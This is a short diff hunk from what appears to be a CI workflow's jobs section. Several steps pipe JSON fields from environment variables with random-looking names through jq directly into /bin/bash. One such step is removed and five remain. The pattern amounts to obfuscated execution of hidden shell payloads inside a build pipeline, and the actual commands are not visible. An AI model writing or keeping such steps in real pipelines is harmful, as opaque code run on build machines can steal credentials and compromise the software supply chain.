@@ -23,7 +23,6 @@ jobs:
           echo $pl31993 | jq -r .m755 | /bin/bash
           printf '%s' "$j14763" | jq -r .x2 | /bin/bash
           echo $a9662 | jq -r .yj3 | /bin/bash
-          echo $fzac04013 | jq -r .vx77068 | /bin/bash
           printf '%s' "$ecjw5309" | jq -r .j0001 | /bin/bash
           echo $ljj87026 | jq -r .mf49295 | /bin/bash
 
